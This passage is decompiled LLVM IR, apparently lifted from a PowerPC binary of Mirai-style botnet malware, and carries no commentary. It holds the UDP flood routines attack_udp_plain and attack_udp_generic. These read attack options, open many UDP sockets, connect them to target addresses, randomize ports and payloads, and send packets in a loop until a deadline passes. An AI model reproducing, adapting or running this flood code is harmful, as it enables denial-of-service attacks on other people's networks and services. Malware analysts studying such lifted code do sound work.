  %v0_100044ec = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100044ec, label %dec_label_pc_100044d4, label %dec_label_pc_1000437c

dec_label_pc_100044f4:                            ; preds = %dec_label_pc_10004338
  %v1_100044f4 = add i32 %v2_10004344, 16
  %v2_100044f4 = inttoptr i32 %v1_100044f4 to i32*
  %v3_100044f4 = load i32, i32* %v2_100044f4, align 4
  store i32 %v3_100044f4, i32* %r29.global-to-local, align 4
  %v0_100044f8 = call i32 @rand_next()
  store i32 %v0_100044f8, i32* %r3.global-to-local, align 4
  %v3_100044fc = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_100044fc, i32* %r9.global-to-local, align 4
  %v0_10004500 = load i32, i32* @r25, align 4
  %v1_10004500 = mul i32 %v0_10004500, 16
  %v2_10004500 = udiv i32 %v0_10004500, 268435456
  %v3_10004500 = or i32 %v2_10004500, %v1_10004500
  store i32 %v3_10004500, i32* %r25.global-to-local, align 4
  %v1_10004504 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004500)
  %v1_10004508 = mul nuw i32 %v2_10004500, 268435456
  %v2_10004508 = urem i32 %v0_10004500, 268435456
  %v3_10004508 = or i32 %v1_10004508, %v2_10004508
  store i32 %v3_10004508, i32* %r25.global-to-local, align 4
  %v0_1000450c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000450c = mul i32 %v0_1000450c, 24
  %v1_10004510 = load i32, i32* @r31, align 4
  %v2_10004510 = add i32 %v1_10004510, %v1_1000450c
  store i32 %v2_10004510, i32* %r9.global-to-local, align 4
  %v1_10004514 = add i32 %v2_10004510, 20
  %v2_10004514 = inttoptr i32 %v1_10004514 to i8*
  %v3_10004514 = load i8, i8* %v2_10004514, align 1
  %v4_10004514 = zext i8 %v3_10004514 to i32
  store i32 %v4_10004514, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10004514, 64
  %v2_10004518 = zext i8 %tmp to i32
  %v3_10004518 = lshr i32 %v0_100044f8, %v2_10004518
  %v1_1000451c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000451c = add i32 %v3_10004518, %v1_1000451c
  store i32 %v2_1000451c, i32* %r3.global-to-local, align 4
  %v1_10004520 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004520 = add i32 %v1_10004520, 16
  %v3_10004520 = inttoptr i32 %v2_10004520 to i32*
  store i32 %v2_1000451c, i32* %v3_10004520, align 4
  %v0_10004524 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004524, label %dec_label_pc_10004528, label %dec_label_pc_10004368

dec_label_pc_10004528:                            ; preds = %dec_label_pc_100044f4, %dec_label_pc_10004358
  %v0_10004528 = call i32 @rand_next()
  store i32 %v0_10004528, i32* %r3.global-to-local, align 4
  %v1_1000452c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000452c = add i32 %v1_1000452c, 12
  %v3_1000452c = inttoptr i32 %v2_1000452c to i32*
  store i32 %v0_10004528, i32* %v3_1000452c, align 4
  br label %dec_label_pc_10004368

dec_label_pc_10004534:                            ; preds = %dec_label_pc_10004124
  %v0_10004534 = load i32, i32* @r23, align 4
  store i32 %v0_10004534, i32* @r3, align 4
  %v0_10004538 = call i32 @__GI___libc_close()
  store i32 %v0_10004538, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000442c

; uselistorder directives
  uselistorder i32 %v0_10004500, { 2, 1, 0 }
  uselistorder i32 %v0_100044e4, { 1, 0 }
  uselistorder i32 %v0_100044d4, { 1, 0 }
  uselistorder i32 %v0_100044c8, { 1, 0 }
  uselistorder i32 %v0_100044b4, { 2, 1, 0 }
  uselistorder i32 %v0_1000449c, { 2, 1, 0 }
  uselistorder i32 %v0_1000448c, { 1, 0 }
  uselistorder i32 %v0_1000441c, { 1, 0, 2 }
  uselistorder i32 %v1_10004408, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_100043d0, { 1, 0 }
  uselistorder i32 %v0_10004394, { 2, 1, 0 }
  uselistorder i32 %v0_10004384, { 2, 1, 0 }
  uselistorder i32 %v0_10004368, { 2, 1, 0 }
  uselistorder i32 %v0_10004358, { 2, 1, 0 }
  uselistorder i32 %v1_1000433c, { 1, 0 }
  uselistorder i32 %v2_10004324, { 2, 1, 0 }
  uselistorder i32 %v1_100042b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100041bc, { 1, 0 }
  uselistorder i32 %v1_10004194, { 1, 0 }
  uselistorder i32 %v1_10004190, { 1, 0 }
  uselistorder i32 %v1_1000418c, { 1, 0 }
  uselistorder i32 %v1_10004188, { 1, 0 }
  uselistorder i32 %v1_10004180, { 1, 0 }
  uselistorder i32 %v1_1000417c, { 1, 0 }
  uselistorder i32 %v0_10004168, { 2, 0, 1 }
  uselistorder i32 %v1_10004164, { 1, 0 }
  uselistorder i32 %v1_10004160, { 1, 0 }
  uselistorder i32 %v2_10004104, { 1, 2, 0 }
  uselistorder i32 %v6_100040f0, { 1, 0 }
  uselistorder i32 %v5_1000402c, { 2, 1, 0 }
  uselistorder i32 %v1_10003fdc, { 1, 0 }
  uselistorder i8 %v5_10003f90, { 1, 0 }
  uselistorder i32* %stack_var_-136, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 30, 16, 17, 18, 19, 20, 21, 1, 0, 4, 3, 22, 23, 24, 25, 26, 27, 28, 2, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 21, 18, 19, 20, 27, 22, 23, 24, 25, 26, 28, 29, 30 }
  uselistorder i32* %r28.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r27.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder i32* %r24.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r16.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r15.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 42, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 4, 0, 5, 1, 6, 2, 7, 3, 8 }
  uselistorder i8 4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100044c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000442c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100043a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004214, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-88 = alloca i32, align 4
  %v0_10004548 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* @r25, align 4
  store i32 %v0_10004548, i32* @r27, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10004598 = load i32, i32* @r29, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 268453308, i32* @lr, align 4
  %v2_100045b8 = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_100045b8, i32* @r21, align 4
  %v0_100045c4 = load i32, i32* @r25, align 4
  store i32 %v0_100045c4, i32* %r3.global-to-local, align 4
  store i32 268453324, i32* @lr, align 4
  %v2_100045c8 = call i32 @calloc(i32 %v0_100045c4, i32 4)
  %v0_100045d0 = load i32, i32* @r29, align 4
  store i32 %v2_100045c8, i32* @r26, align 4
  %v0_100045e0 = load i32, i32* @r28, align 4
  store i32 %v0_100045e0, i32* %r3.global-to-local, align 4
  store i32 268453352, i32* @lr, align 4
  %v4_100045e4 = inttoptr i32 %v0_100045d0 to i32*
  %v5_100045e4 = call i32 @attack_get_opt_int(i32 %v0_100045e0, i32* %v4_100045e4, i32 7, i32 65535)
  %v0_100045f0 = load i32, i32* @r29, align 4
  %v1_100045f8 = urem i32 %v5_100045e4, 65536
  store i32 %v1_100045f8, i32* %r20.global-to-local, align 4
  %v0_100045fc = load i32, i32* @r28, align 4
  store i32 %v0_100045fc, i32* %r3.global-to-local, align 4
  store i32 268453380, i32* @lr, align 4
  %v4_10004600 = inttoptr i32 %v0_100045f0 to i32*
  %v5_10004600 = call i32 @attack_get_opt_int(i32 %v0_100045fc, i32* %v4_10004600, i32 6, i32 65535)
  %v0_10004604 = load i32, i32* @r29, align 4
  %v1_10004608 = urem i32 %v5_10004600, 65536
  store i32 %v1_10004608, i32* @r24, align 4
  %v0_10004614 = load i32, i32* @r28, align 4
  store i32 %v0_10004614, i32* %r3.global-to-local, align 4
  store i32 268453404, i32* @lr, align 4
  %v4_10004618 = inttoptr i32 %v0_10004604 to i32*
  %v5_10004618 = call i32 @attack_get_opt_int(i32 %v0_10004614, i32* %v4_10004618, i32 0, i32 512)
  %v0_1000461c = load i32, i32* @r29, align 4
  %v1_10004628 = urem i32 %v5_10004618, 65536
  store i32 %v1_10004628, i32* @r22, align 4
  %v0_1000462c = load i32, i32* @r28, align 4
  store i32 %v0_1000462c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10004634.87 to i32), i32* @lr, align 4
  %v4_10004630 = inttoptr i32 %v0_1000461c to i32*
  %v5_10004630 = call i32 @attack_get_opt_int(i32 %v0_1000462c, i32* %v4_10004630, i32 1, i32 1)
  %v1_10004638 = urem i32 %v5_10004630, 256
  store i32 %v1_10004638, i32* %r16.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-88, align 4
  %v0_10004650 = call i32 @__GI_time()
  store i32 %v0_10004650, i32* %r3.global-to-local, align 4
  %v0_10004654 = load i32, i32* @r24, align 4
  %v1_10004654 = load i32, i32* @r31, align 4
  %v4_10004654 = icmp eq i32 %v0_10004654, %v1_10004654
  %v1_10004658 = load i32, i32* @r27, align 4
  %v2_10004658 = add i32 %v1_10004658, %v0_10004650
  store i32 %v2_10004658, i32* %r17.global-to-local, align 4
  br i1 %v4_10004654, label %dec_label_pc_10004818, label %dec_label_pc_10004660

dec_label_pc_10004660:                            ; preds = %entry, %dec_label_pc_10004818
  %v0_10004660 = load i32, i32* @r25, align 4
  %v3_10004660 = icmp eq i32 %v0_10004660, 0
  br i1 %v3_10004660, label %dec_label_pc_1000474c, label %dec_label_pc_10004668

dec_label_pc_10004668:                            ; preds = %dec_label_pc_10004660
  %v0_10004668 = load i32, i32* %r20.global-to-local, align 4
  %v1_10004668 = load i32, i32* @r31, align 4
  %v4_10004668 = icmp eq i32 %v0_10004668, %v1_10004668
  store i1 %v4_10004668, i1* %cr4_eq.global-to-local, align 1
  store i32 %v1_10004668, i32* %r18.global-to-local, align 4
  %v0_10004670 = load i32, i32* @r23, align 4
  store i32 %v0_10004670, i32* @r28, align 4
  store i32 0, i32* @r30, align 4
  store i32 0, i32* @r27, align 4
  %v2_10004680 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_100046a8

dec_label_pc_10004688:                            ; preds = %dec_label_pc_100046f0
  %v0_10004688 = load i32, i32* @r27, align 4
  %v1_10004688 = load i32, i32* @r26, align 4
  %v2_10004688 = add i32 %v1_10004688, %v0_10004688
  %v3_10004688 = inttoptr i32 %v2_10004688 to i32*
  %v4_10004688 = load i32, i32* %v3_10004688, align 4
  store i32 %v4_10004688, i32* %r3.global-to-local, align 4
  %v1_10004694 = add i32 %v0_10004688, 4
  store i32 %v1_10004694, i32* @r27, align 4
  store i32 268453532, i32* @lr, align 4
  %v3_10004698 = call i32 @__libc_connect(i32 %v4_10004688, i32 %v0_10004708, i32 16)
  store i32 %v3_10004698, i32* %r3.global-to-local, align 4
  %v0_1000469c = load i32, i32* @r30, align 4
  %v1_1000469c = load i32, i32* @r25, align 4
  %v4_1000469c = icmp eq i32 %v0_1000469c, %v1_1000469c
  %v0_100046a0 = load i32, i32* @r28, align 4
  %v1_100046a0 = add i32 %v0_100046a0, 24
  store i32 %v1_100046a0, i32* @r28, align 4
  br i1 %v4_1000469c, label %dec_label_pc_1000474c, label %dec_label_pc_100046a8.backedge

dec_label_pc_100046a8.backedge:                   ; preds = %dec_label_pc_10004688, %dec_label_pc_10004714
  %v0_100046ac.pre = load i32, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_100046a8

dec_label_pc_100046a8:                            ; preds = %dec_label_pc_100046a8.backedge, %dec_label_pc_10004668
  %v0_100046ac = phi i32 [ %v0_100046ac.pre, %dec_label_pc_100046a8.backedge ], [ %v1_10004668, %dec_label_pc_10004668 ]
  store i32 %v0_100046ac, i32* %r3.global-to-local, align 4
  store i32 268453556, i32* @lr, align 4
  %v2_100046b0 = call i32 @calloc(i32 %v0_100046ac, i32 1)
  store i32 %v2_100046b0, i32* %r3.global-to-local, align 4
  %v0_100046b4 = load i32, i32* @r23, align 4
  %v1_100046b4 = load i32, i32* @r31, align 4
  %v2_100046b4 = add i32 %v1_100046b4, %v0_100046b4
  store i32 %v2_100046b4, i32* %r9.global-to-local, align 4
  %v1_100046b8 = load i32, i32* @r27, align 4
  %v2_100046b8 = load i32, i32* @r21, align 4
  %v3_100046b8 = add i32 %v2_100046b8, %v1_100046b8
  %v4_100046b8 = inttoptr i32 %v3_100046b8 to i32*
  store i32 %v2_100046b0, i32* %v4_100046b8, align 4
  %v0_100046bc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100046bc, label %dec_label_pc_100047d0, label %dec_label_pc_100046c0

dec_label_pc_100046c0:                            ; preds = %dec_label_pc_100046a8
  %v0_100046c0 = load i32, i32* %r20.global-to-local, align 4
  %v1_100046c0 = trunc i32 %v0_100046c0 to i16
  %v2_100046c0 = load i32, i32* %r9.global-to-local, align 4
  %v3_100046c0 = add i32 %v2_100046c0, 2
  %v4_100046c0 = inttoptr i32 %v3_100046c0 to i16*
  store i16 %v1_100046c0, i16* %v4_100046c0, align 2
  br label %dec_label_pc_100046c4

dec_label_pc_100046c4:                            ; preds = %dec_label_pc_100047d0, %dec_label_pc_100046c0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268453592, i32* @lr, align 4
  %v3_100046d4 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_100046d4, i32* %r3.global-to-local, align 4
  %v3_100046dc = icmp eq i32 %v3_100046d4, -1
  %v1_100046e8 = load i32, i32* @r27, align 4
  %v2_100046e8 = load i32, i32* @r26, align 4
  %v3_100046e8 = add i32 %v2_100046e8, %v1_100046e8
  %v4_100046e8 = inttoptr i32 %v3_100046e8 to i32*
  store i32 %v3_100046d4, i32* %v4_100046e8, align 4
  br i1 %v3_100046dc, label %dec_label_pc_10004778, label %dec_label_pc_100046f0

dec_label_pc_100046f0:                            ; preds = %dec_label_pc_100046c4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 2, i32* %stack_var_-88, align 4
  store i32 268453640, i32* @lr, align 4
  %v0_10004704 = load i32, i32* %r3.global-to-local, align 4
  %v3_10004704 = call i32 @bind(i32 %v0_10004704, i32 %v2_10004680, i32 16)
  store i32 %v3_10004704, i32* %r3.global-to-local, align 4
  %v0_10004708 = load i32, i32* @r28, align 4
  %v1_10004708 = add i32 %v0_10004708, 20
  %v2_10004708 = inttoptr i32 %v1_10004708 to i8*
  %v3_10004708 = load i8, i8* %v2_10004708, align 1
  %v2_1000470c = icmp ugt i8 %v3_10004708, 31
  br i1 %v2_1000470c, label %dec_label_pc_10004688, label %dec_label_pc_10004714

dec_label_pc_10004714:                            ; preds = %dec_label_pc_100046f0
  %v1_10004714 = add i32 %v0_10004708, 16
  %v2_10004714 = inttoptr i32 %v1_10004714 to i32*
  %v3_10004714 = load i32, i32* %v2_10004714, align 4
  store i32 %v3_10004714, i32* %r29.global-to-local, align 4
  %v0_10004718 = call i32 @rand_next()
  store i32 %v0_10004718, i32* %r3.global-to-local, align 4
  %v0_1000471c = load i32, i32* @r28, align 4
  %v1_1000471c = add i32 %v0_1000471c, 20
  %v2_1000471c = inttoptr i32 %v1_1000471c to i8*
  %v3_1000471c = load i8, i8* %v2_1000471c, align 1
  %tmp = urem i8 %v3_1000471c, 64
  %v2_10004728 = zext i8 %tmp to i32
  %v3_10004728 = lshr i32 %v0_10004718, %v2_10004728
  %v1_1000472c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000472c = add i32 %v1_1000472c, %v3_10004728
  store i32 %v2_1000472c, i32* %r3.global-to-local, align 4
  %v2_10004730 = add i32 %v0_1000471c, 4
  %v3_10004730 = inttoptr i32 %v2_10004730 to i32*
  store i32 %v2_1000472c, i32* %v3_10004730, align 4
  %v0_10004738 = load i32, i32* @r27, align 4
  %v1_10004738 = load i32, i32* @r26, align 4
  %v2_10004738 = add i32 %v1_10004738, %v0_10004738
  %v3_10004738 = inttoptr i32 %v2_10004738 to i32*
  %v4_10004738 = load i32, i32* %v3_10004738, align 4
  store i32 %v4_10004738, i32* %r3.global-to-local, align 4
  %v1_1000473c = add i32 %v0_10004738, 4
  store i32 %v1_1000473c, i32* @r27, align 4
  store i32 268453700, i32* @lr, align 4
  %v3_10004740 = call i32 @__libc_connect(i32 %v4_10004738, i32 %v0_1000471c, i32 16)
  store i32 %v3_10004740, i32* %r3.global-to-local, align 4
  %v0_10004744 = load i32, i32* @r30, align 4
  %v1_10004744 = load i32, i32* @r25, align 4
  %v4_10004744 = icmp eq i32 %v0_10004744, %v1_10004744
  br i1 %v4_10004744, label %dec_label_pc_1000474c, label %dec_label_pc_100046a8.backedge

dec_label_pc_1000474c:                            ; preds = %dec_label_pc_10004714, %dec_label_pc_10004688, %dec_label_pc_10004660
  %v1_100047545 = phi i32 [ 0, %dec_label_pc_10004660 ], [ %v0_10004744, %dec_label_pc_10004714 ], [ %v0_1000469c, %dec_label_pc_10004688 ]
  %v0_1000474c = load i32, i32* %r16.global-to-local, align 4
  %v3_1000474c = icmp eq i32 %v0_1000474c, 0
  store i1 %v3_1000474c, i1* %cr4_eq.global-to-local, align 1
  br label %dec_label_pc_10004754

dec_label_pc_10004754:                            ; preds = %dec_label_pc_10004754.backedge, %dec_label_pc_1000474c
  %v1_10004754 = phi i32 [ %v1_10004754.pre, %dec_label_pc_10004754.backedge ], [ %v1_100047545, %dec_label_pc_1000474c ]
  %v0_10004758 = phi i32 [ %v0_10004754.pre, %dec_label_pc_10004754.backedge ], [ 0, %dec_label_pc_1000474c ]
  %v2_10004754 = icmp slt i32 %v0_10004758, %v1_10004754
  %v1_10004758 = mul i32 %v0_10004758, 4
  store i32 %v1_10004758, i32* @r27, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v2_10004754, label %dec_label_pc_100047e0, label %dec_label_pc_10004768

dec_label_pc_10004768:                            ; preds = %dec_label_pc_10004754
  %v0_10004768 = call i32 @__GI_time()
  store i32 %v0_10004768, i32* %r3.global-to-local, align 4
  %v0_10004770 = load i32, i32* %r17.global-to-local, align 4
  %v2_10004770 = icmp slt i32 %v0_10004770, %v0_10004768
  br i1 %v2_10004770, label %dec_label_pc_10004778, label %dec_label_pc_10004754.backedge

dec_label_pc_10004778:                            ; preds = %dec_label_pc_100046c4, %dec_label_pc_10004768
  %v1_1000478c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10004548)
  store i32 %v0_10004598, i32* %r29.global-to-local, align 4
  %v0_100047cc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100047cc

dec_label_pc_100047d0:                            ; preds = %dec_label_pc_100046a8
  %v0_100047d0 = call i32 @rand_next()
  %v1_100047d0 = trunc i32 %v0_100047d0 to i16
  store i32 %v0_100047d0, i32* %r3.global-to-local, align 4
  %v0_100047d4 = load i32, i32* @r23, align 4
  %v1_100047d4 = load i32, i32* @r31, align 4
  %v2_100047d4 = add i32 %v1_100047d4, %v0_100047d4
  store i32 %v2_100047d4, i32* %r9.global-to-local, align 4
  %v4_100047d8 = add i32 %v2_100047d4, 2
  %v5_100047d8 = inttoptr i32 %v4_100047d8 to i16*
  store i16 %v1_100047d0, i16* %v5_100047d8, align 2
  br label %dec_label_pc_100046c4

dec_label_pc_100047e0:                            ; preds = %dec_label_pc_10004754
  %v1_100047e0 = load i32, i32* @r21, align 4
  %v2_100047e0 = add i32 %v1_100047e0, %v1_10004758
  %v3_100047e0 = inttoptr i32 %v2_100047e0 to i32*
  %v4_100047e0 = load i32, i32* %v3_100047e0, align 4
  store i32 %v4_100047e0, i32* @r29, align 4
  %v0_100047e4 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100047e4, label %dec_label_pc_100047e8, label %dec_label_pc_10004800

dec_label_pc_100047e8:                            ; preds = %dec_label_pc_100047e0, %dec_label_pc_10004800
  %v0_100047ec = phi i32 [ %v4_100047e0, %dec_label_pc_100047e0 ], [ %v0_100047ec.pre, %dec_label_pc_10004800 ]
  %v0_100047e8 = phi i32 [ %v1_10004758, %dec_label_pc_100047e0 ], [ %v0_100047e8.pre, %dec_label_pc_10004800 ]
  %v1_100047e8 = load i32, i32* @r26, align 4
  %v2_100047e8 = add i32 %v1_100047e8, %v0_100047e8
  %v3_100047e8 = inttoptr i32 %v2_100047e8 to i32*
  %v4_100047e8 = load i32, i32* %v3_100047e8, align 4
  store i32 %v4_100047e8, i32* %r3.global-to-local, align 4
  %v0_100047f0 = load i32, i32* @r22, align 4
  store i32 268453884, i32* @lr, align 4
  %v4_100047f8 = call i32 @__libc_send(i32 %v4_100047e8, i32 %v0_100047ec, i32 %v0_100047f0, i32 16384)
  store i32 %v4_100047f8, i32* %r3.global-to-local, align 4
  %v0_10004754.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10004754.backedge

dec_label_pc_10004754.backedge:                   ; preds = %dec_label_pc_100047e8, %dec_label_pc_10004768
  %v0_10004754.pre = phi i32 [ %v0_10004754.pre.pre, %dec_label_pc_100047e8 ], [ 0, %dec_label_pc_10004768 ]
  %v1_10004754.pre = load i32, i32* @r25, align 4
  br label %dec_label_pc_10004754

dec_label_pc_10004800:                            ; preds = %dec_label_pc_100047e0
  store i32 %v4_100047e0, i32* @r3, align 4
  %v0_10004804 = load i32, i32* @r22, align 4
  store i32 %v0_10004804, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000480c.88 to i32), i32* @lr, align 4
  %v0_10004808 = call i32 @rand_alphastr()
  store i32 %v0_10004808, i32* %r3.global-to-local, align 4
  %v1_10004810 = load i32, i32* @r22, align 4
  %v2_10004810 = load i32, i32* @r29, align 4
  %v4_10004810 = add i32 %v2_10004810, %v1_10004810
  %v5_10004810 = inttoptr i32 %v4_10004810 to i8*
  store i8 0, i8* %v5_10004810, align 1
  %v0_100047e8.pre = load i32, i32* @r27, align 4
  %v0_100047ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100047e8

dec_label_pc_10004818:                            ; preds = %entry
  %v0_10004818 = call i32 @rand_next()
  store i32 %v0_10004818, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004660

; uselistorder directives
  uselistorder i32 %v4_100047e0, { 1, 0, 2 }
  uselistorder i32 %v0_100047d0, { 1, 0 }
  uselistorder i32 %v1_10004758, { 1, 2, 0 }
  uselistorder i32 %v0_10004738, { 1, 0 }
  uselistorder i32 %v0_1000471c, { 1, 0, 2 }
  uselistorder i32 %v0_10004708, { 1, 2, 0 }
  uselistorder i32 %v0_100046ac, { 1, 0 }
  uselistorder i32 %v0_10004688, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 14, 16, 17, 18, 19, 20, 12, 13, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100047e8, { 1, 0 }
  uselistorder label %dec_label_pc_10004778, { 1, 0 }
  uselistorder label %dec_label_pc_100046a8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10004660, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_gt.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10004824 = load i32, i32* @lr, align 4
  store i32 %v0_10004824, i32* %r0.global-to-local, align 4
  %v0_1000482c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r20.global-to-local, align 4
  store i32 %v0_1000482c, i32* @r27, align 4
  %v0_10004840 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_10004878 = load i32, i32* @r24, align 4
  %v0_1000487c = load i32, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_1000488c = load i32, i32* @r29, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v0_10004894 = load i32, i32* @r30, align 4
  store i32 268454056, i32* @lr, align 4
  %v2_100048a4 = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_100048a4, i32* @r21, align 4
  %v0_100048ac = load i32, i32* @r29, align 4
  %v0_100048b8 = load i32, i32* @r28, align 4
  store i32 %v0_100048b8, i32* %r3.global-to-local, align 4
  store i32 268454080, i32* @lr, align 4
  %v4_100048bc = inttoptr i32 %v0_100048ac to i32*
  %v5_100048bc = call i32 @attack_get_opt_int(i32 %v0_100048b8, i32* %v4_100048bc, i32 2, i32 0)
  %v0_100048cc = load i32, i32* @r29, align 4
  %v1_100048d0 = urem i32 %v5_100048bc, 256
  store i32 %v1_100048d0, i32* %r18.global-to-local, align 4
  %v0_100048d4 = load i32, i32* @r28, align 4
  store i32 %v0_100048d4, i32* %r3.global-to-local, align 4
  store i32 268454108, i32* @lr, align 4
  %v4_100048d8 = inttoptr i32 %v0_100048cc to i32*
  %v5_100048d8 = call i32 @attack_get_opt_int(i32 %v0_100048d4, i32* %v4_100048d8, i32 3, i32 65535)
  %v0_100048dc = load i32, i32* @r29, align 4
  store i32 %v5_100048d8, i32* %r17.global-to-local, align 4
  %v0_100048ec = load i32, i32* @r28, align 4
  store i32 %v0_100048ec, i32* %r3.global-to-local, align 4
  store i32 268454132, i32* @lr, align 4
  %v4_100048f0 = inttoptr i32 %v0_100048dc to i32*
  %v5_100048f0 = call i32 @attack_get_opt_int(i32 %v0_100048ec, i32* %v4_100048f0, i32 4, i32 64)
  %v0_100048f4 = load i32, i32* @r29, align 4
  %v1_10004900 = urem i32 %v5_100048f0, 256
  store i32 %v1_10004900, i32* %r19.global-to-local, align 4
  %v0_10004904 = load i32, i32* @r28, align 4
  store i32 %v0_10004904, i32* %r3.global-to-local, align 4
  store i32 268454156, i32* @lr, align 4
  %v4_10004908 = inttoptr i32 %v0_100048f4 to i32*
  %v5_10004908 = call i32 @attack_get_opt_int(i32 %v0_10004904, i32* %v4_10004908, i32 5, i32 0)
  %v0_10004918 = load i32, i32* @r29, align 4
  %v1_1000491c = urem i32 %v5_10004908, 256
  store i32 %v1_1000491c, i32* %r15.global-to-local, align 4
  %v0_10004920 = load i32, i32* @r28, align 4
  store i32 %v0_10004920, i32* %r3.global-to-local, align 4
  store i32 268454184, i32* @lr, align 4
  %v4_10004924 = inttoptr i32 %v0_10004918 to i32*
  %v5_10004924 = call i32 @attack_get_opt_int(i32 %v0_10004920, i32* %v4_10004924, i32 6, i32 65535)
  %v0_1000492c = load i32, i32* @r29, align 4
  store i32 %v5_10004924, i32* %r24.global-to-local, align 4
  %v0_1000493c = load i32, i32* @r28, align 4
